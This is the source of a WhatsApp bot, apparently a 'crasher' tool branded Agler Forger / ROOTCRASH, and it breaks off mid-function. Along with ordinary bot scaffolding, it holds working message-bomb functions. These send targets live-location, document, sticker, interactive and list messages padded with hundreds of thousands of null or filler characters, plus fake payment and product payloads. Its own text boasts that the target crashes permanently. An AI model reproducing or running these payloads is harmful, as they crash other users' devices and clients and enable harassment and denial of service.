module.exports = async (kandiXD, m, store) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const mime = (quoted.msg || quoted).mimetype || ''
const text = q = args.join(" ")
const isGroup = from.endsWith('@g.us')
const botNumber = await kandiXD.decodeJid(kandiXD.user.id)
const sender = m.key.fromMe ? (kandiXD.user.id.split(':')[0]+'@s.whatsapp.net' || kandiXD.user.id) : (m.key.participant || m.key.remoteJid)
const tescuk = ["0@s.whatsapp.net"]
const senderNumber = sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await kandiXD.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const totalFitur = () =>{
            var mytext = fs.readFileSync("./V4 ROOTCRASH").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')
const { Client } = require('ssh2');
const jsobfus = require('javascript-obfuscator');
const { addSaldo, minSaldo, cekSaldo } = require("./database/dtbs/deposit");
const { mediafireDl } = require('./database/dtbs/mediafire.js') 
let db_saldo = JSON.parse(fs.readFileSync("./database/dtbs/saldo.json"));
const { beta1, beta2, buk1 } = require("./database/lib/hdr.js")
const thebug = fs.readFileSync(`./database/image/thebug.jpg`)
const byxz = fs.readFileSync(`./database/image/ROOTCRASH.jpg`) 
const zkosong = fs.readFileSync(`./database/image/zkosong.png`)

const bugres = '🎃⃟𒆜𝐬𝐮𝐜𝐜𝐞𝐬 𝐬𝐞𝐧𝐝 𝐛𝐮𝐠⃟╳🎃'
const bugsuc = '『 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃』\n\n🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃\n\n  𝐍𝐎𝐓𝐄\n> Jika target masih c2 biarin aja tapi itu target tetap crash permanen'
// VIRTEX
		const {
			ios
		} = require("./database/virtex/ios.js")
		const {
			freeze
		} = require("./database/virtex/freeze.js")
		const {
			convite
		} = require("./database/virtex/convite.js")
		const {
			bugpdf
		} = require("./database/virtex/bugpdf.js")
		const {
			bugurl
		} = require('./database/virtex/bugUrl.js')
		const {
		    talapreta3
	    } = require('./database/virtex/telapreta3.js')
	    
// Auto Blocked Nomor +212
if (m.sender.startsWith('212')) return kandiXD.updateBlockStatus(m.sender, 'block')

// Random Color
const listcolor = ['red','green','yellow','blue','magenta','cyan','white']
const randomcolor = listcolor[Math.floor(Math.random() * listcolor.length)]

let run = runtime(process.uptime())


// Command Yang Muncul Di Console
if (isCmd) {
console.log(chalk.white.bgRed.bold('Ada Pesan'), color(`[🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 ]`, `green`), color(`FROM`, `red`), color(`${pushname}`, `red`), color(`Text :`, `yellow`), color(`${body}`, `blue`))
}

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if (time2 < "23:59:00") {
            var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if (time2 < "19:00:00") {
            var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if (time2 < "18:00:00") {
            var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if (time2 < "15:00:00") {
            var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if (time2 < "10:00:00") {
            var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if (time2 < "05:00:00") {
            var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if (time2 < "03:00:00") {
            var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
       
    kandiXD.autoshalat = kandiXD.autoshalat ? kandiXD.autoshalat : {}
    let id = m.chat
    if (id in kandiXD.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:29',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        kandiXD.autoshalat[id] = [
            kandiXD.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mp4',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat Menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./database/image/jadwal.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }

const qevent = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
'message': {
  "eventMessage": {
    "isCanceled": false,
    "name": 'kandiXD',
    "description": "Pntk",
    "location": {
      "degreesLatitude": 0,
      "degreesLongitude": 0,
      "name": "Apakajajanabs"
    },
    "joinLink": "https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D",
    "startTime": "1713724680"
  }
}
}

const ryoreqphone = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"requestPhoneNumberMessage": {
"contextinfo": 1
}
}
}

const ryovoice = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 9999999999,
"ptt": "true"
}
}
}

const fpoll = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: ""
} : {})
},
message: {
"pollCreationMessage": {
"name": "p"
}
}
}

const ryobug = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`
}
}
}

const ryobut = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
buttonsResponseMessage: {
selectedButtonId: '🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃',
type: 1,
response: {
selectedDisplayText: 'penis'
}
}
}
}

const ryocakep = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363325294099425@newsletter`,
newsletterName: `🎃`,
jpegThumbnail: ''
}
}
};

const qpay = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: 'USD',
amount1000: 999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `
}
},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: 'INR'
}
}
}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
}
}
}
const qvn = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"audioMessage": {
"mimetype": "audio/ogg; codecs=opus",
"seconds": 359996400,
"ptt": "true"
}
}
}

const qtext = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"extendedTextMessage": {
"text": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"title": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`,
}
}
}

const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
},
"title": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"description": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃`,
"currencyCode": "IDR",
"priceAmount1000": "1000000000000000000",
"retailerId": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}

const qgif = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"h": `Hmm`,
'seconds': '359996400',
'gifPlayback': 'true',
'caption': `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
}
}
}

const qinvite = {
key: {
participant: "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": "777@g.us",
"inviteCode": "m",
"groupName": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"caption": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
}
}
}

const qvideo = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"videoMessage": {
"title": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"h": `Hmm`,
'seconds': '359996400',
'caption': `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
'viewOnce': true
}
}
}

const qloc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
locationMessage: {
name: `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
}
}
}

const qloc2 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
"liveLocationMessage": {
"title": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
"h": `Hmm`,
}
}
}

const qcontact = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 `,
'vcard': `BEGIN:VCARD\nVERSION:5.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=0\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}
}
}
//REVISION\\
		async function LIVELOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "mass",
							"caption": `sv AndraZyy` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			})
			await kandiXD.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await kandiXD.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await kandiXD.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://img100.pixhost.to/images/963/544171424_sevsbotz.jpg"
							}
						}, {
							upload: kandiXD.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 !!"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: QUOTED
			});
			await ryozingod.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		const PORKE = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/thebug.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const PORKE2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./database/image/thebug.jpg`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐧͢𝐟𝐢ͮ𝐧͢𝐢𝐭𝐲͜͡⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "sv AndraZyy",
    "caption": `🎃⃟𒆜𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲×⃟🎃.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await kandiXD.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await kandiXD.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `🎃⃟𒆜𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲×⃟🎃.xp`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await kandiXD.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await kandiXD.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://img100.pixhost.to/images/963/544171424_sevsbotz.jpg" } }, { upload: kandiXD.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #kandiXDdominate"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await kandiXD.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃"+" ".repeat(920000),
        'footerText': `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃.xp`,
        'description': `🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: ryobug });
await kandiXD.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//

// Read Database
const contacts = JSON.parse(fs.readFileSync("./database/dtbs/contacts.json"))
const prem = JSON.parse(fs.readFileSync("./database/dtbs/premium.json"))
const ownerNumber = JSON.parse(fs.readFileSync("./database/dtbs/owner.json"))

// Cek Database
const isContacts = contacts.includes(sender)
const isPremium = prem.includes(sender)
const isOwner = ownerNumber.includes(senderNumber) || isBot

// BUTTON VIDEO
   kandiXD.sendButtonVideo = async (jid, buttons, quoted, opts = {}) => {
      var video = await prepareWAMessageMedia({
         video: {
            url: opts && opts.video ? opts.video : ''
         }
      }, {
         upload: kandiXD.waUploadToServer
      })
      let message = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               interactiveMessage: {
  body: {
     text: opts && opts.body ? opts.body : ''
  },
  footer: {
     text: opts && opts.footer ? opts.footer : ''
  },
  header: {
     hasMediaAttachment: true,
     videoMessage: video.videoMessage,
  },
  nativeFlowMessage: {
     buttons: buttons,
     messageParamsJson: ''
  }, contextInfo: {
      externalAdReply: {
      title: global.namabot,
      body: `By AndraZyy`,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.isLink,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
               
               }
            }
         }
      }, {
         quoted
      })
      await kandiXD.sendPresenceUpdate('composing', jid)
      return kandiXD.relayMessage(jid, message["message"], {
         messageId: message.key.id
      })
   }
		    
		async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await kandiXD.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
